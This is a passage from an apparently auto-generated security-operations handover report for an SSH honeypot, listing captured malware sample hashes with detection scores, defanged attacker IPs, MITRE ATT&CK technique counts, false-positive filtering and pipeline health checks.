| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **25/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.183.111[.]36` | IN | Web Werks | **100** ⚠️ | 1 |
| `193.24.211[.]100` | BG | Layer7 Networks GmbH | **100** ⚠️ | 1 |
| `190.95.224[.]198` | EC | Telconet S.A | **100** ⚠️ | 21 |
| `135.232.182[.]226` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `185.71.233[.]73` | CZ | United Networks SE | **100** ⚠️ | 3 |
| `14.103.84[.]166` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `68.168.211[.]82` | US | Interserver, Inc | **100** ⚠️ | 1 |
| `138.197.147[.]76` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `155.4.244[.]107` | SE | Bahnhof AB, Sweden | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 25 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 13 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (82 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 66 |
| AbuseIPDB score 17 below threshold 25 | 9 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 343 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 82 filtered (23.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 13 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 240 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-09T17:00:27Z_
